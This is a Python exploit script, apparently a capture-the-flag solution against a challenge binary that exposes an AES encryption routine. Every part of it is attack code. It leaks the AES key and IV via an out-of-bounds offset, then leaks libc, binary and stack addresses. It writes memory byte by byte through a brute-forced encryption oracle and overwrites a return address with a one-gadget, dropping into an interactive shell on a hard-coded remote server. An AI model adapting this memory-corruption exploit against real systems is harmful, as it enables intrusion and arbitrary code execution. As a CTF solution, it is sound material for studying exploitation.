#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from Crypto.Cipher import AES

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'3.113.219.89', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
offset_data         = binf.sep_section['.data']
offset_key          = binf.symbols['AESkey']
offset_buf          = binf.symbols['buf']
offset_stderr       = binf.symbols['stderr']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stderr      = libc.symbols['_IO_2_1_stderr_']
offset_libc_onegadget   = 0x10a38c

#==========

def attack(conn, **kwargs):
    cis = CryptoInShell(conn)

    leak = cis.enc(offset_key - offset_buf, 0x20)
    cis.key, cis.iv = leak[:0x10], leak[0x10:]

    addr_libc_stderr = u(cis.leak(offset_stderr - offset_buf, 8)[:8])
    libc.address = addr_libc_stderr - offset_libc_stderr
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['environ']
    addr_libc_onegadget = libc.address + offset_libc_onegadget

    addr_data    = u(cis.leak(offset_data - offset_buf, 0x10)[8:0x10]) - 8
    binf.address = addr_data - offset_data
    info('addr_base         = 0x{:08x}'.format(binf.address))
    addr_buf            = binf.symbols['buf']

    addr_stack_env  = u(cis.leak(addr_libc_environ - addr_buf, 0x8)[:8])
    info('addr_stack_env    = 0x{:08x}'.format(addr_stack_env))
    addr_stack_i    = addr_stack_env - 0x120
    addr_stack_ret  = addr_stack_i + 0x30

    cis.enc(addr_stack_i-2 - addr_buf, 0x8)

    cis.set(addr_libc_environ - addr_buf, p64(addr_stack_env))
    cis.set(addr_stack_ret - addr_buf, p64(addr_libc_onegadget))

    conn.sendlineafter('offset:', 'x')
    
class CryptoInShell:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def enc(self, ofs, size):
        size = size - 0x10 if size > 0x10 else 1
        self.sendlineafter('offset:', str(ofs))
        self.sendlineafter('size:', str(size))
        return self.recv((size&~0xf) + 0x10)

    def leak(self, ofs, size):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        data = self.enc(ofs, size)
        return aes.decrypt(data)

    def set(self, ofs, data):
        for i in range(len(data)):
            s = self.enc(ofs+i, 1)
            if s[0] == data[i]:
                continue

            n = 0
            while True:
                n += 1
                aes = AES.new(self.key, AES.MODE_CBC, self.iv)
                s = aes.encrypt(s)
                if s[0] == data[i]:
                    break
            for _ in range(n):
                self.send('{}\n{}\n'.format(ofs+i, 1))
            self.recvuntil('size:'+s)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()

#==========
